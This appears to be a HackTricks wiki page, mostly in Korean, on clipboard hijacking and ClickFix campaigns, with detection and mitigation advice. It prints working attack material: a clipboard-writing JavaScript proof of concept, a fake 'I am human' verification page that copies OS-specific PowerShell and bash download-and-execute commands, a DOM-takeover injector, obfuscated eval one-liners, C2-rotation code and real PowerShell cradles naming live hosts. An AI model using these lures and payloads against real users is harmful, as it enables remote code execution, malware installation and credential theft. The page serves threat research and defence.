# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – 오래됐지만 여전히 유효한 조언

## Overview

Clipboard hijacking – *pastejacking*이라고도 함 – 사용자가 내용을 검사하지 않고 명령을 복사-붙여넣기하는 습관을 악용한다. 악성 웹 페이지(또는 Electron이나 Desktop application 같은 JavaScript 실행 가능한 컨텍스트)는 공격자가 제어하는 텍스트를 시스템 clipboard에 프로그램적으로 넣는다. 피해자는 보통 신중하게 구성된 social-engineering 지시에 따라 **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell)를 누르거나 terminal을 열고 clipboard 내용을 *paste*하도록 유도되며, 즉시 임의의 commands를 실행하게 된다.

**file이 다운로드되지 않고 attachment가 열리지 않기** 때문에, 이 technique는 attachment, macros 또는 직접 command execution을 모니터링하는 대부분의 e-mail 및 web-content security controls를 우회한다. 따라서 이 attack은 NetSupport RAT, Latrodectus loader 또는 Lumma Stealer 같은 commodity malware families를 배포하는 phishing campaigns에서 자주 사용된다.

## Wallet-address replacement clippers

다른 **clipboard hijacking** variant는 commands를 전혀 붙여넣지 않는다. 대신 피해자가 **cryptocurrency wallet address**를 복사할 때까지 기다렸다가, paste 직전에 그것을 공격자가 제어하는 주소로 조용히 바꾼다. 이는 사용자가 보통 앞/뒤 문자만 확인하는 긴 wallet formats에 특히 효과적이다.

일반적인 실제 특징:
- **Thin loader + nested payload**: 보이는 app/exe는 합법적인 trading 또는 "profit" tool처럼 보이지만, 실제 clipper는 bundle 더 깊숙이 숨겨져 있다(예: nested Rust payload를 실행하는 .NET loader).
- **Regex-driven replacement**: malware는 `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` 같은 문자열이나 일반적인 **44-character Solana-like** 문자열까지 매칭하여 attacker wallets로 다시 쓴다.
- **Wallet rotation at scale**: 현대 Windows samples는 단일 static address 대신 currency별로 **수천 개**의 replacement wallets를 포함할 수 있어, 각 theft 후 wallet reputation 소모를 줄인다.

### Windows clipper flow

일반적인 구현은 **`AddClipboardFormatListener`**로 등록된 hidden window이다. 각 clipboard update마다 malware는 보통 다음을 호출한다:
- **`OpenClipboard`** → 현재 clipboard data에 접근.
- **`GetClipboardData`** → text 읽기.
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string을 attacker value로 교체.

클리퍼에서 자주 보이는 최소 hunting regexes:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
User-level persistence만으로도 충분한 영향이 있습니다. 관찰된 패턴 중 하나는:
- payload를 **`%APPDATA%\silke\silke.exe`**로 복사
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` 아래에 **Startup-folder LNK** 생성

Detection ideas:
- 클립보드 APIs를 지속적으로 호출하면서 동시에 `%APPDATA%`와 사용자 **Startup** 폴더에 쓰기를 수행하는 processes.
- 새 LNK/executable 생성 후 wallet-address clipboard rewrites가 이어지는 경우.
- 사용되지 않는 파일이 많이 포함된 archives 또는 fake-software bundles와, nested binary를 실행하는 작은 launcher.

### macOS social-engineered quarantine removal + LaunchAgent persistence

macOS에서 일부 campaigns는 **`unlocker.command`** helper를 함께 제공하고, Gatekeeper가 앱이 damaged 되었거나 unidentified developer에서 온 것으로 표시하면 피해자에게 right-click → **Open**을 하라고 안내합니다. 이 script는 단순히 quarantine을 제거하고 근처의 `.app`를 실행합니다:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
이것은 **Gatekeeper exploit**가 아니라, Gatekeeper 결정이 `com.apple.quarantine` xattr에 의존한다는 사실을 악용하는 **social-engineered quarantine bypass**입니다.

실행 후, clipper는 다음을 기록하여 현재 사용자로 지속될 수 있습니다:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad`와 `KeepAlive`가 있는 LaunchAgent

유용한 방어 관점의 세부사항은 일부 샘플이 약 30초마다 LaunchAgent와 wrapper를 다시 쓰는 **self-healing watchdog**을 구현한다는 점입니다. 실행 중인 프로세스를 **종료하지 않고** 먼저 plist를 제거하면, malware가 즉시 다시 생성할 수 있습니다. 안전한 정리 순서:
1. 활성 clipper 프로세스를 종료합니다.
2. LaunchAgent plist를 unload/delete 합니다.
3. `~/launch.sh`와 복사된 payload를 삭제합니다.

### Delivery note: fake reputation as a force multiplier

이 계열에서는 malware 자체는 기술적으로 단순하게 유지될 수 있지만, **distribution layer**가 핵심 역할을 합니다: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, 그리고 benign-looking VirusTotal comments/votes를 사용해 실행 전에 binary가 신뢰할 수 있어 보이게 만듭니다.

## Forced copy buttons and hidden payloads (macOS one-liners)

일부 macOS infostealers는 installer sites(예: Homebrew)를 clone하고 **“Copy” button 사용을 강제**하여 사용자가 보이는 텍스트만 선택하지 못하게 합니다. clipboard entry에는 예상되는 installer command와 함께 Base64 payload가 덧붙여져 있으며(예: `...; echo <b64> | base64 -d | sh`), 따라서 한 번의 paste로 둘 다 실행되고 UI는 추가 stage를 숨깁니다.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
이전 캠페인에서는 `document.execCommand('copy')`를 사용했고, 최신 캠페인에서는 비동기 **Clipboard API** (`navigator.clipboard.writeText`)에 의존합니다.

## The ClickFix / ClearFake Flow

1. 사용자가 typosquatted 또는 compromised site(예: `docusign.sa[.]com`)를 방문함
2. 주입된 **ClearFake** JavaScript가 `unsecuredCopyToClipboard()` helper를 호출하여 Base64로 인코딩된 PowerShell one-liner를 클립보드에 조용히 저장함.
3. HTML instructions가 피해자에게 다음을 안내함: *“**Win + R**를 누르고, command를 붙여넣은 뒤 Enter를 눌러 문제를 해결하세요.”*
4. `powershell.exe`가 실행되어, legitimate executable과 malicious DLL을 포함한 archive를 다운로드함(클래식 DLL sideloading).
5. loader가 추가 stage를 decrypt하고, shellcode를 inject하며 persistence(예: scheduled task)를 설치함 – 최종적으로 NetSupport RAT / Latrodectus / Lumma Stealer를 실행함.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (정상적인 Java WebStart)는 해당 디렉터리에서 `msvcp140.dll`을 검색합니다.
* 악성 DLL은 **GetProcAddress**로 API를 동적으로 resolve하고, **curl.exe**를 통해 두 개의 바이너리 (`data_3.bin`, `data_4.bin`)를 다운로드한 뒤, 롤링 XOR key `"https://google.com/"`를 사용해 이를 복호화하고, 최종 shellcode를 주입한 다음 **client32.exe**(NetSupport RAT)를 `C:\ProgramData\SecurityCheck_v1\`에 unzip합니다.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `curl.exe`로 `la.txt`를 다운로드합니다.
2. **cscript.exe** 내부에서 JScript downloader를 실행합니다.
3. MSI payload를 가져옵니다 → 서명된 application 옆에 `libcef.dll`을 드롭합니다 → DLL sideloading → shellcode → Latrodectus.

### MSHTA를 통한 Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** 호출은 숨겨진 PowerShell 스크립트를 실행하며, 이 스크립트는 `PartyContinued.exe`를 가져오고, `Boat.pst`(CAB)를 추출한 뒤, `extrac32`와 파일 연결을 통해 `AutoIt3.exe`를 재구성하고, 최종적으로 브라우저 자격 증명을 `sumeriavgv.digital`로 exfiltrates 하는 `.a3x` 스크립트를 실행한다.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

일부 ClickFix 캠페인은 파일 다운로드를 완전히 건너뛰고, 피해자에게 WSH를 통해 JavaScript를 가져와 실행하는 one-liner를 붙여넣도록 지시한 뒤, 이를 persist시키고, C2를 매일 rotating한다. 관찰된 예시 체인은 다음과 같다:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
주요 특징
- 실행 시점에 역전된 obfuscated URL을 복원해 대충 훑어보는 것을 방지.
- JavaScript는 Startup LNK (WScript/CScript)를 통해 자신을 지속시키며, 현재 날짜에 따라 C2를 선택함 – 빠른 domain rotation을 가능하게 함.

날짜별로 C2를 바꾸는 데 사용되는 최소 JS fragment:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
다음 단계는 일반적으로 지속성을 확립하고 RAT(예: PureHVNC)를 가져오는 loader를 배포하며, 종종 하드코딩된 certificate에 TLS pinning을 하고 트래픽을 chunking합니다.

이 변종에 특화된 Detection 아이디어
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (또는 `cscript.exe`).
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 안의 LNK가 `%TEMP%`/`%APPDATA%` 아래 JS path를 가진 WScript/CScript를 호출.
- Registry/RunMRU 및 command-line telemetry에 `.split('').reverse().join('')` 또는 `eval(a.responseText)` 포함.
- 긴 command line 없이 긴 script를 전달하기 위해 대용량 stdin payload를 사용하는 반복적인 `powershell -NoProfile -NonInteractive -Command -`.
- 이후 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` 같은 LOLBins를 실행하는 Scheduled Tasks, 보통 updater처럼 보이는 task/path 아래(예: `\GoogleSystem\GoogleUpdater`).

Threat hunting
- `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` 패턴을 가진 매일 교체되는 C2 hostname과 URL.
- clipboard write events 이후 Win+R paste, سپس 바로 `powershell.exe` 실행을 상관 분석.

Blue-teams는 clipboard, process-creation, registry telemetry를 결합해 pastejacking abuse를 식별할 수 있습니다:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`는 **Win + R** 명령 기록을 유지합니다 – 비정상적인 Base64 / obfuscated entries를 찾으세요.
* Security Event ID **4688** (Process Creation)에서 `ParentImage` == `explorer.exe` 이고 `NewProcessName`이 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } 중 하나인 경우.
* 의심스러운 4688 이벤트 직전에 `%LocalAppData%\Microsoft\Windows\WinX\` 또는 temporary folders 아래에서 발생한 file creations에 대한 Event ID **4663**.
* EDR clipboard sensors(있다면) – `Clipboard Write` 직후 새로운 PowerShell process와 상관 분석.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

최근 캠페인은 가짜 CDN/browser verification pages("Just a moment…", IUAM-style)를 대량 생성하여 사용자가 clipboard의 OS-specific commands를 native consoles에 복사하도록 유도합니다. 이는 browser sandbox 밖으로 execution을 전환하며 Windows와 macOS 전반에서 동작합니다.

builder-generated pages의 핵심 특징
- `navigator.userAgent`를 통한 OS detection으로 payload를 맞춤화(Windows PowerShell/CMD vs. macOS Terminal). 지원되지 않는 OS에는 선택적 decoy/no-op를 사용해 그럴듯함을 유지.
- 보이는 text가 clipboard content와 다를 수 있는 상태에서, 무해한 UI action(checkbox/Copy)으로 자동 clipboard-copy.
- Mobile blocking과 단계별 안내 popover: Windows → Win+R→paste→Enter; macOS → Terminal 열기→paste→Enter.
- 선택적 obfuscation과 single-file injector로 compromised site의 DOM을 Tailwind-styled verification UI로 덮어쓰기(새 domain registration 불필요).

예시: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS initial run의 persistence
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`를 사용하면 터미널이 닫힌 뒤에도 실행이 계속되어, 눈에 띄는 흔적이 줄어듭니다.

침해된 사이트에서의 인플레이스 페이지 takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
- IUAM-style lure에 특화된 Detection & hunting 아이디어
- Web: Clipboard API를 verification widgets에 바인딩하는 페이지; 표시된 텍스트와 clipboard payload 불일치; `navigator.userAgent` branching; 의심스러운 context에서 Tailwind + single-page replace.
- Windows endpoint: 브라우저 interaction 직후 `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%`에서 실행되는 batch/MSI installers.
- macOS endpoint: Terminal/iTerm이 브라우저 event 근처에서 `bash`/`curl`/`base64 -d`와 함께 `nohup`을 실행; terminal 종료 후에도 살아남는 background jobs.
- `RunMRU` Win+R history와 clipboard writes를 이후의 console process creation과 correlate.

지원 기술도 참고

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake는 계속해서 WordPress sites를 compromise하고 loader JavaScript를 주입해 external hosts(Cloudflare Workers, GitHub/jsDelivr)와 blockchain “etherhiding” calls(예: `bsc-testnet.drpc[.]org` 같은 Binance Smart Chain API endpoints로의 POSTs)까지 chain하여 현재 lure logic을 가져온다. 최근 overlay는 아무것도 다운로드하지 말고 한 줄 명령을 copy/paste 하라고 안내하는 fake CAPTCHAs를 크게 사용한다(T1204.004).
- Initial execution은 점점 signed script hosts/LOLBAS에 위임된다. 2026년 1월 chains는 이전의 `mshta` 사용을 `WScript.exe`를 통해 실행되는 built-in `SyncAppvPublishingServer.vbs`로 바꾸고, aliases/wildcards가 포함된 PowerShell-like arguments를 넘겨 remote content를 가져왔다:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs`는 서명되어 있으며 보통 App-V에 사용된다; `WScript.exe`와 비정상적인 인자들(`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs)과 함께 쓰이면 ClearFake용 high-signal LOLBAS stage가 된다.
- 2026년 2월의 fake CAPTCHA payloads는 다시 순수 PowerShell download cradles로 전환되었다. 두 개의 live examples:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 첫 번째 체인은 in-memory `iex(irm ...)` grabber이고, 두 번째는 `WinHttp.WinHttpRequest.5.1`을 통해 스테이징한 뒤 temp `.ps1`을 쓰고 `-ep bypass`로 hidden window에서 실행합니다.

이 변형들에 대한 detection/hunting tips
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` 또는 clipboard writes/Win+R 직후의 PowerShell cradles.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, 또는 raw IP `iex(irm ...)` 패턴.
- Network: 웹 브라우징 직후 script hosts/PowerShell에서 CDN worker hosts나 blockchain RPC endpoints로 나가는 outbound.
- File/registry: `%TEMP%` 아래 임시 `.ps1` 생성과 함께 이런 one-liners를 포함한 RunMRU entries; 외부 URL 또는 obfuscated alias strings로 실행되는 signed-script LOLBAS(WScript/cscript/mshta)를 block/alert.

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining

최근 Red Canary telemetry에 따르면, 안정적인 indicator는 **정확히 하나의 명령**이 아니라 **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, **immediate execution**의 조합입니다.

### Notable operator patterns

- **Paste confirmation telemetry**: 일부 payload는 실제 stage 전에 `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted`를 호출합니다. 이는 사용자 상호작용을 확인하면서도 window를 짧고 조용하게 유지합니다.
- **Fake verification comments**: PowerShell one-liners는 `# Security check ✔️ I'm not a robot Verification ID: 138105` 같은 문자열을 덧붙여, Run / `cmd.exe` / PowerShell history에 붙여넣어진 뒤에도 명령이 CAPTCHA 관련처럼 보이게 합니다.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))`는 command line에 static URL을 두지 않으면서도 in-memory download-and-execute를 수행합니다.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q`는 특이한 대소문자와 flag의 Unicode-like characters를 악용해 brittle detections를 깨면서도 `msiexec.exe`처럼 보이게 합니다.
- **Caret-escaped LOLBin chains**: `cmd.exe`는 `^` escapes(`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`)로 keyword를 숨기고, nested shell을 minimized로 시작하며, 공격자 content를 `.pdf` 같은 benign extension으로 저장한 뒤 `mshta`를 통해 실행할 수 있습니다.
## Mitigations

1. Browser hardening – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` 등) 비활성화 또는 user gesture 요구.
2. Security awareness – 사용자가 민감한 명령은 *직접 입력*하도록 교육하거나, 먼저 text editor에 붙여넣게 하기.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control로 arbitrary one-liners 차단.
4. Network controls – known pastejacking 및 malware C2 domains로의 outbound 요청 차단.

## Related Tricks

* **Discord Invite Hijacking**는 악성 server로 유인한 뒤 같은 ClickFix 접근 방식을 자주 악용합니다:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
